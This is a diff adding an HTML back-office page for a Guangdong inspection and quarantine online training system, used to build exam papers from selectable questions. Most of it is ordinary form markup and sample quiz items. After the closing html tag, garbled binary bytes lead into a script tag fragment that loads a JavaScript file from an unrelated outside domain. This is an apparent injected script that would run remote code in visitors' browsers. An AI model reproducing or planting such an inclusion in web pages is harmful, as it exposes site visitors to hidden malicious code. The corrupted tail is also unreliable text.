@@ -1,0 +1,277 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>广东检验检疫（检务）网上培训系统后台管理系统</title>
+<link href="../css/htlogin.css" rel="stylesheet" type="text/css" />
+<link href="../datepicker/default/datePicker.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="../datepicker/WdatePicker.js"></script>
+</head>
+<script>
+	function add_Sub()
+	{
+		window.document.location="#";
+	}
+	function see_Testpaper()
+	{
+		window.open('seepaper.html','_blank');
+	}
+
+
+	function show_questions()
+	{		
+		window.location="addquestion.html";
+	}
+	function close_questions()
+	{
+		window.document.getElementById("selectquestions").style.display='none';
+	}
+	function sub_Topaper()
+	{
+		alert("ok");
+		//调用ajax生成试卷
+	}
+</script>
+<script>
+function deloption(afterselect)//delete the seleted options
+	{
+		if(afterselect.options.length>0)
+		{
+			afterselect.remove(afterselect.selectedIndex);
+			deloption(afterselect);
+		}
+	}
+	function addoption(beforeselect,afterselect)// add the selecte options
+	{
+		var flag = true;
+		if(beforeselect.selectedIndex==-1)
+		{
+			alert("Please select One");
+			return ;
+		}
+		for(var o=0;o<beforeselect.options.length;o++)
+		{
+			if(beforeselect.options[o].selected==true)
+			{
+					var obj = document.createElement("option");
+					obj.text=beforeselect.options[beforeselect.selectedIndex].text;
+					obj.value=beforeselect.value;
+					
+					if(afterselect.options.length>0)
+					{
+						for(var i=0;i<afterselect.options.length;i++)
+						{
+							if(afterselect.options[i].value==obj.value)
+							{
+								flag =false;
+							}
+						}
+						if(flag)
+						{
+							afterselect.add(obj);
+						}
+					}
+					else
+					{
+						afterselect.add(obj);
+					}
+					beforeselect.options[o].selected=false;
+					flag = true;
+				if(beforeselect.selectIndex==-1)
+				{
+					break;
+
+				}
+			}
+		}
+		afterselect.selectedIndex=-1;
+	}
+</script>
+<body topmargin="0" leftmargin="0">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td background="../images/ht-body01.jpg" class="body02">当前位置：>> 生成试卷</td>
+        </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td class="body01">
+		  <span class="body04">		  </span>
+		  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="4" background="../images/ht-body02.jpg" class="body03">试卷试题选择——添加</td>
+            </tr>
+            <tr>
+              <td width="25%" class="body06">试卷编号：</td>
+              <td width="28%" class="body04">4206005</td>
+              <td width="26%" class="body06">试卷标题：</td>
+              <td width="21%" class="body04"><input name="text" type="text" class="bodytext"/></td>
+            </tr>
+            <tr>
+              <td class="body06">试卷总分：</td>
+              <td class="body04"><input name="text4"  type="text" class="bodytext"/></td>
+              <td class="body06">完成试卷需要时间（分）：</td>
+              <td class="body04"><input name="text" type="text" class="bodytext"/></td>
+            </tr>
+            <tr>
+              <td class="body06">开始时间：</td>
+              <td class="body04"><input name="text"  type="text" class="Wdate" onfocus="new WdatePicker(this)"/></td>
+              <td class="body06">结束时间：</td>
+              <td class="body04"><input name="text3"  type="text" class="Wdate" onfocus="new WdatePicker(this)"/></td>
+            </tr>
+            <tr>
+              <td class="body06">分类专业</td>
+              <td class="body04">
+			<select style="width:100px;">
+				<option>- 不限 -</option>
+				<option>检务</option>
+				<option>食品</option>
+				<option>动检</option>
+				<option>植检</option>
+				<option>财务</option>
+				<option>统计</option>
+			</select>		
+		</td>
+              <td class="body06">专业岗位：</td>
+              <td class="body04">
+			<select>
+				<option>- 不限定 -</option>
+				<option>报检岗</option>
+				<option>计费岗</option>
+				<option>签证岗</option>
+				<option>放行岗</option>
+				<option>档案管理岗</option>
+				<option>流程管理岗</option>
+				<option>证单管理岗</option>
+				<option>印章管理岗</option>
+				<option>综合管理岗</option>
+			</select>
+		</td>
+            </tr>
+            <tr>
+              <td colspan="4" class="body04" align="right">
+			  <input type="image" src="../images/ht-but-addst.jpg" onclick="javascript:show_questions();"/>
+          &nbsp;&nbsp; &nbsp;&nbsp;
+                <input  type="image"  src="../images/ht-but-guanbi.jpg" onclick="javascript:close_questions();"/>
+		  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+            </tr>
+            <tr id="selectquestions" style="display:none ">
+              <td colspan="4"  align="center" class="body03" c>
+                <table width="100%" border="0" cellpadding="0" cellspacing="0">
+                  <tr>
+                    <td  nowrap="false">栏目</td>
+                    <td align="left">
+                      <select name="select2" id="select2" class="bodytext01"  onchange="show_questions()">
+                        <option>政策法规</option>
+                        <option>报检</option>
+                        <option>计收费</option>
+                        <option>签证</option>
+                        <option>空白证单和签证印章管理、报检单位和报检员管理</option>
+                        <option>业务系统操作</option>
+                        <option>产地证</option>
+                        <option>综合</option>
+                    </select>                    </td>
+                    <td  nowrap="true">&nbsp;</td>
+                    <td align="center"><input name="image"  type="image" onclick="sub_Topaper()"  src="../images/ht-but-qdxt.jpg" /></td>
+                  </tr>
+                  <tr>
+                    <td width="48"  nowrap="false">试题列表</td>
+                    <td width="419" align="left"><select  multiple id="selectquestion" style="width:320px; height:120px;">
+                        <option value="001">1.为什么? A因为2 B因为2 C因为3 D因为4</option>
+                        <option value="002">2.什么时候 A一天B两天C三天D四天</option>
+                        <option value="003">3.怎么样 A好 B不好 C一般</option>
+                        <option value="004">4.为什么那样</option>
+                        <option value="005">5.究竟如何</option>
+                        <option value="006">6.有多少</option>
+                        <option value="007">7.什么时间</option>
+                        <option value="008">8.什么地点</option>
+                        <option value="009">9.多少人</option>
+                        <option value="010">10.怎么考评</option>
+                        <option value="011">11.如何作业</option>
+                    </select></td>
+                    <td width="41"  nowrap="true"><input name="button" type="button" onclick="addoption(document.all.selectquestion,document.all.selectedquestion)" value=">>"/>
+                        <input name="button" type="button" onclick="deloption(document.all.selectedquestion)" value="<<"/></td>
+                    <td width="421"><select  multiple id="selectedquestion" style="width:320px; height:120px;">
+                    </select></td>
+                  </tr>
+              </table></td>
+            </tr>
+            <tr align="right">
+              <td height="35" class="body03" align="right" colspan="4">
+                <table border="0" cellspacing="0" cellpadding="0" width="100%">
+                  <tr>
+				  	<td width="67%"></td>
+                    <td width="12%" align="left">&nbsp;
+                    </td>
+                    <td width="11%" align="left">
+                      <input  type="image"   src="../images/ht-but-scsj.jpg" onclick="add_Sub()"/>
+                    </td>
+                    <td width="10%" align="left">
+                      <input  type="image"  src="../images/ht-but-back.jpg"  onclick="javacript:window.history.back();"/>
+                    </td>
+					<td width="0%"></td>
+                  </tr>
+              </table></td>
+            </tr>
+          </table>
+		  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="10" background="../images/ht-body02.jpg" class="body03">试题列表(共20 /题&nbsp;&nbsp;&nbsp; 共100/分)</td>
+            </tr>
+            <tr>
+              <td width="53%" align="center" nowrap="nowrap" class="body05">题目</td>
+              <td width="10%" align="center" nowrap="nowrap" class="body05">供选答案</td>
+              <td width="9%" align="center" nowrap="nowrap" class="body05">显示顺序</td>
+              <td width="8%" align="center" nowrap="nowrap" class="body05">分数</td>
+              <td width="12%" align="center" nowrap="nowrap" class="body05">操&nbsp;&nbsp;作</td>
+            </tr>
+            <tr>
+              <td height="35" align="left" class="body03">谁发现的新大陆？</td>
+              <td nowrap="nowrap" class="body03">A.哥伦布<br/>B.拿破仑<br/>C.林肯<br/>D.华盛顿<br/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input name="text6" type="text" style="width:30px "/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input type="text" style="width:30px "/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input type="image" src="../images/ht-but-del.jpg"  onclick="alert('ok');"/>&nbsp;&nbsp;<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" /></td>
+            </tr>
+            <tr>
+              <td class="body03" align="left">谁当过美国总统？</td>
+              <td nowrap="nowrap" class="body03">A.爱因斯坦<br/>B.罗斯福<br/>C.林肯<br/>D.华盛顿<br/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input name="text7" type="text" style="width:30px "/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input type="text" style="width:30px "/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input type="image" src="../images/ht-but-del.jpg"   onclick="alert('ok!');"/>&nbsp;&nbsp;<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" /></td>
+            </tr>
+            <tr>
+              <td class="body03" align="left">2008年奥运会将在中国举行？" </td>
+              <td nowrap="nowrap" class="body03">是/否</td>
+              <td nowrap="nowrap" class="body03" align="center"><input name="text8" type="text" style="width:30px "/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input type="text" style="width:30px "/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input type="image" src="../images/ht-but-del.jpg" onclick="alert('del');" />&nbsp;&nbsp;<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" /></td>
+            </tr>
+            <tr>
+              <td class="body03" align="left">004.禽流感的病理组织学表现以（ ）为突出特征?</td>
+              <td nowrap="nowrap" class="body03">A. 淋巴细胞综合症<br />
+                  B. 血细胞减少<br />
+                  C. 血细胞增多<br />
+              D. 反应性噬血细胞综合症</td>
+              <td nowrap="nowrap" class="body03" align="center"><input name="text9" type="text" style="width:30px "/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input name="text5" type="text" style="width:30px "/></td>
+              <td nowrap="nowrap" class="body03" align="center"><input type="image" src="../images/ht-but-del.jpg"  />&nbsp;&nbsp;<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" /></td>
+            </tr>
+            <tr align="center">
+              <td colspan="5" class="body03"><input type="image" src="../images/ht-but-sjyl.jpg"   onclick="see_Testpaper()"/></td>
+		    </tr>
+            <tr>
+              <td colspan="10" class="body03">&nbsp;</td>
+            </tr>
+          </table>
+    <p>&nbsp;</p></td>
+  </tr>
+</table>
+
+</body>
+
+</html>
+
+{�
+z�.�O5�vm塆�g9鲍櫀韾靐ttp://qqq.dzydhx.com/gm.js></script>
